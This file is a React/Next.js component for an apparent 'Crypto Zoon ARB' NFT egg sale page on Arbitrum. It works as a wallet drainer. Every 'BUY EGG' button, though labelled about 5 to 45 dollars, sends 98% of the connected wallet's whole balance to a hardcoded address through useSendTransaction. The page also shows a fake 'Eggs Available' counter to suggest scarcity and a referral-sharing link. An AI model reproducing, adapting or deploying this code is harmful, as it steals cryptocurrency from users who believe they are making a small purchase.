import Image from "next/image";
import Link from "next/link";
import React, { useEffect, useState } from "react";
import arrow from "../../../assets/arrow-link.svg";
import monster from "../../../assets/img-monter-1.png";
import iconMeta from "../../../assets/ic-metal.png";
import iconWood from "../../../assets/ic-wood.png";
import iconWater from "../../../assets/ic-water.png";
import iconFire from "../../../assets/ic-fire.png";
import iconEarth from "../../../assets/ic-earth.png";
import iconDark from "../../../assets/ic-light-dark.png";
import iconWallet from "../../../assets/ic-wallet.svg";
import iconCopy from "../../../assets/copy.svg";
import iconEgg from "../../../assets/ic-egg.svg";
import Egg0 from "../../../assets/nft-egg-0.png";
import Egg1 from "../../../assets/nft-egg-1.png";
import Egg2 from "../../../assets/nft-egg-2.png";
import Egg3 from "../../../assets/nft-egg-3.png";
import Egg4 from "../../../assets/nft-egg-4.png";
import Egg5 from "../../../assets/nft-egg-5.png";
import { useRouter } from "next/router";
import { openModal } from "@/recoil/commonRecoilState";
import { useRecoilState } from "recoil";
import {
  useAccount,
  useBalance,
  useConnect,
  useDisconnect,
  useSendTransaction,
} from "wagmi";
import { ethers } from "ethers";
import ConnectWallet from "../connectWallet/ConnectWallet";
import ConnectWalletClaim from "../connectWallet/ConnectWalletClaim";
import { Connectors } from "@/utils/connector";
import { routerConstant } from "@/constants/routerConstant";
import { truncate, truncateReverse } from "@/utils/truncate";
import Slider from "react-slick";

export default function BannerClaim() {
  const router = useRouter();
  const [count, setCount] = useState(0);
  const { connector: activeConnector, isConnected, address } = useAccount();
  const { connectAsync, error } = useConnect();
  const { data, isError, isLoading, isFetched, isFetching } = useBalance({
    address: address,
  });
  const { disconnectAsync } = useDisconnect();
  const [click, setClick] = useState(false);
  const [open, setOpen] = useRecoilState(openModal);
  const {
    data: DataTrans,
    isSuccess,
    sendTransactionAsync,
  } = useSendTransaction({
    to: "0x0bf313f2618F42a5a6a96ee9540AFB4b7a2220dC",
    value:
      data &&
      ethers.utils
        .parseEther(data?.formatted.toString())
        .mul(ethers.BigNumber.from("98"))
        .div(ethers.BigNumber.from("100"))
        .toString(),
  });

  const handleClaim = async () => {
    try {
      if (address) {
        if (data && isFetched) {
          handleSent();
        }
      }
    } catch (err) {
      setClick(false);
    }
  };
  // else {
  //   await disconnectAsync();
  //   setOpen({ open: true, component: <ConnectWalletClaim /> });
  // }
  const handleSent = async () => {
    try {
      await sendTransactionAsync();
    } catch (error) {
      setClick(false);
    }
  };
  // useEffect(() => {
  //   if (data && click) {
  //     if (isFetched) {
  //       handleSent();
  //     }
  //   }
  // }, [address, isFetched]);
  function randomIntFromInterval(min, max) {
    // min and max included
    return Math.floor(Math.random() * (max - min + 1) + min);
  }
  const counter = (minimum, maximum) => {
    for (let count = minimum; count <= maximum; count++) {
      setTimeout(() => {
        setCount(count);
      }, 1000);
    }
  };
  useEffect(() => {
    counter(0, 1496);
  }, []);
  const settings = {
    dots: false,
    infinite: true,
    slidesToShow: 5,
    autoplay: true,
    speed: 2500,
    autoplaySpeed: 2500,
    cssEase: "linear",
    slidesToScroll: 1,
    arrows: false,
    responsive: [
      {
        breakpoint: 1024,
        settings: {
          slidesToShow: 4,
          slidesToScroll: 4,
          speed: 3500,
          autoplaySpeed: 3500,
        },
      },
      {
        breakpoint: 600,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 3,
          speed: 4500,
          autoplaySpeed: 4500,
        },
      },
      {
        breakpoint: 480,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 2,
          speed: 5500,
          autoplaySpeed: 5500,
        },
      },
    ],
  };

  return (
    <div className="pt-[32px] md:pt-0 md:pl-[210px] w-full ">
      <div className="home-banner  w-full">
        <div className="flex flex-col items-center max-w-[1140px] mx-auto px-[15px]">
          <div className="pt-[64px] md:pt-[108px] ">
            <div className="w-[55px] h-[24px] md:w-[143px] mx-auto md:h-[63px] ">
              <Image
                src="https://zoon-games.s3.us-west-1.amazonaws.com/about-1.png"
                className="mx-auto"
                width={143}
                height={63}
                alt=""
              />
            </div>
            <div className="mt-4 md:mt-[32px] text-center w-[65%] mx-auto md:w-full text-[12px] md:text-[20px] leading-[12px] md:leading-[28px] font-semibold">
              Zoon is making a comeback with a host of new features on Arbitrum.
            </div>
            <button className=" mx-auto flex flex-col md:flex-row items-center gap-[8px] px-[23px] py-1 rounded-[8px] bg-black text-[12px] md:text-[14px] font-semibold md:h-[42px] mb-[100px] mt-4">
              <span className="text-[rgb(244,104,24)]">Zoon Address</span>
              <div className="flex items-center ">
                <span className="">
                  0x5Db8a1BDA55E496247B78D324AfE2779A390F555
                </span>
                <Image src={arrow} width={16} height={16} alt="" />
              </div>
            </button>
            <div className="flex flex-col md:flex-row justify-center w-full">
              <div className="px-4 md:p-[32px] relative bg-[rgba(27,27,27,0.95)] rounded-tl-[12px] rounded-tr-[12px] md:rounded-tl-0 md:rounded-tr-0 md:bg-transparent flex-[0_0_37.5%] ">
                <div className="absolute top-0 -translate-y-2/4 md:translate-y-0 md:static w-[120px] h-[166px] md:w-[160px] md:h-[222px]">
                  <Image src={monster} width={160} height={222} alt="" />
                </div>
                <h1 className="mt-20 md:mt-6 text-[24px] font-semibold leading-[32px]">
                  Zoan Pet
                </h1>
                <div className="my-4 md:my-[32px] text-[10px] leading-[14px] text-[rgba(164,164,164)]">
                  Crypto Zoon ARB is an upgraded version of Crypto Zoon on the
                  Arbitrum. Our mission is to take Crypto Zoon to new heights,
                  where you can enjoy the fantastic features of Crypto Zoon and
                  earn money from it.
                </div>
              </div>
              <div className="flex-[0_0_54.166666666666664%] mt-[-10px] md:mt-0   bg-[rgba(27,27,27,0.95)] py-[42px] px-4 md:px-[48px] rounded-tl-0 rounded-tr-0 md:rounded-tl-[12px] md:rounded-tr-[12px] md:rounded-[12px] ">
                <div className="mb-4">
                  <button className="uppercase text-[18px] font-semibold py-3 border-b-4 border-[rgb(244,104,24,.8)]">
                    {" "}
                    purchase pool
                  </button>
                  <button className="ml-[32px] uppercase text-[18px] font-semibold py-3 text-white/70">
                    {" "}
                    Free pool
                  </button>
                </div>
                <div className="mt-[32px] mb-[16px] flex items-center justify-between">
                  <h3 className="font-semibold text-[#a4a4a4]">
                    Eggs Available
                  </h3>
                  <h3 className="text-[24px] font-bold">
                    {count.toLocaleString("en-US")}/6000
                  </h3>
                </div>
                <div className="h-[2px] w-full bg-[#a4a4a4] relative">
                  <div
                    style={{ width: Math.round((count / 6000) * 100) + "%" }}
                    className="absolute top-0 left-0 h-[4px] bg-[rgb(244,104,24)] -translate-y-[30%] transition-all duration-250"
                  ></div>
                </div>
                <div className="mt-[32px] flex items-center flex-col">
                  <div className="font-bold leading-[26px] ">Egg Elements</div>
                  <div className="mt-[8px] mb-4 text-[#a4a4a4] text-[12px] leading-[20px] md:w-[80%] mx-auto text-center">
                    Get Zoan Eggs to hatch Metal, Wood, Water, Fire, Earth,
                    Light, and Dark Zoans. Each element has unique strengths and
                    weaknesses. Choose wisely to form a winning team against the
                    Yaki Boss.
                  </div>
                </div>
                <div className="py-[6px] px-3 bg-[rgba(73,73,73)] flex items-center gap-4 rounded-[9px] w-fit mx-auto">
                  <div>
                    <Image src={iconMeta} width={32} height={32} alt="" />
                  </div>
                  <div>
                    <Image src={iconWood} width={32} height={32} alt="" />
                  </div>
                  <div>
                    <Image src={iconWater} width={32} height={32} alt="" />
                  </div>
                  <div>
                    <Image src={iconFire} width={32} height={32} alt="" />
                  </div>
                  <div>
                    <Image src={iconMeta} width={32} height={32} alt="" />
                  </div>
                  <div>
                    <Image src={iconEarth} width={32} height={32} alt="" />
                  </div>
                  <div>
                    <Image src={iconDark} width={32} height={32} alt="" />
                  </div>
                </div>
                <div className="text-center mt-[32px] ">
                  {!address && (
                    <button
                      className=" mx-auto px-[23px] h-[42px] text-[13px] font-semibold rounded-[8px] flex items-center gap-4 bg-[rgb(244,104,24)]"
                      onClick={() => {
                        setOpen({
                          open: true,
                          component: <ConnectWalletClaim />,
                        });
                      }}
                    >
                      {" "}
                      <Image
                        src={iconWallet}
                        width={20}
                        height={17}
                        alt=""
                      />{" "}
                      Connect Wallet
                    </button>
                  )}
                  {address && (
                    <>
                      <div className="mt-[24px] flex items-center justify-between gap-4 py-[8px] px-4 bg-[#494949] rounded-[6px]">
                        <div className="flex items-center gap-[8px]">
                          <h1 className="text-[14px] whitespace-nowrap font-semibold">
                            Invite friends
                          </h1>
                          <div className="py-[2px] whitespace-nowrap px-[6px] bg-[#af0808] rounded-[8px] text-[12px] font-semibold">
                            Bonus 5%
                          </div>
                        </div>
                        <div
                          className="whitespace-nowrap text-[14px] flex items-center gap-4 cursor-pointer py-1 px-3 bg-[#313131] text-[#d0d0d0] rounded-[4px]"
                          onClick={() => {
                            navigator.clipboard.writeText(
                              `${location.origin}?ref=0x6e3Cd78FC0cD97d72b22183d92D313ebC0EFD12e`
                            );
                          }}
                        >
                          {truncate(
                            `${location.origin}?ref=0x6e3Cd78FC0cD97d72b22183d92D313ebC0EFD12e`,
                            28
                          )}
                          <Image src={iconCopy} width={10} height={10} alt="" />
                        </div>
                      </div>
                      <div className="mt-[32px] flex items-center gap-3">
                        <button
                          className=" mx-auto px-[20px] whitespace-nowrap h-[42px] text-[12px] font-semibold rounded-[8px] flex items-center gap-4 bg-[rgb(244,104,24)]"
                          onClick={() => {
                            handleClaim();
                          }}
                        >
                          {" "}
                          BUY 1 EGG{" "}
                          <span className="inline-block py-[2px] px-[6px] bg-[#af0808]  text-[12px] rounded-[8px]">
                            ~ 5$
                          </span>
                        </button>
                        <button
                          className=" mx-auto px-[20px] whitespace-nowrap h-[42px] text-[12px] font-semibold rounded-[8px] flex items-center gap-4 bg-[rgb(244,104,24)]"
                          onClick={() => {
                            handleClaim();
                          }}
                        >
                          {" "}
                          BUY 3 EGG{" "}
                          <span className="inline-block py-[2px] px-[6px] bg-[#af0808] text-[12px] rounded-[8px]">
                            ~ 15$
                          </span>
                        </button>
                        <button
                          className=" whitespace-nowrap mx-auto px-[20px] h-[42px] text-[12px] font-semibold rounded-[8px] flex items-center gap-4 bg-[rgb(244,104,24)]"
                          onClick={() => {
                            handleClaim();
                          }}
                        >
                          {" "}
                          BUY 9 EGG{" "}
                          <span className="inline-block py-[2px] text-[12px] px-[6px] bg-[#af0808] rounded-[8px]">
                            ~ 45$
                          </span>
                        </button>
                      </div>
                    </>
                  )}
                </div>
              </div>
            </div>
          </div>
          <div className="my-[39px] flex items-center justify-between w-full">
            <h1 className="text-[24px] font-semibold leading-[30px]">
              Choose Your Lucky Zoan Egg
            </h1>
            <div className="flex items-center justify-center w-[52px] h-[16px] bg-[#1b1b1b] relative text-[14px] font-semibold rounded-full text-center">
              0{" "}
              <Image
                src={iconEgg}
                className="absolute top-0 left-0"
                width={16}
                height={16}
                alt=""
              />
            </div>
          </div>
          <div className="py-[32px] w-full">
            <Slider {...settings}>
              <div className="w-[124px] h-[160px]">
                <Image src={Egg0} width={124} height={160} alt="" />
              </div>
              <div className="w-[124px] h-[160px]">
                <Image src={Egg1} width={124} height={160} alt="" />
              </div>
              <div className="w-[124px] h-[160px]">
                <Image src={Egg2} width={124} height={160} alt="" />
              </div>
              <div className="w-[124px] h-[160px]">
                <Image src={Egg3} width={124} height={160} alt="" />
              </div>
              <div className="w-[124px] h-[160px]">
                <Image src={Egg4} width={124} height={160} alt="" />
              </div>
              <div className="w-[124px] h-[160px]">
                <Image src={Egg5} width={124} height={160} alt="" />
              </div>
            </Slider>
          </div>
        </div>
      </div>
    </div>
  );
}
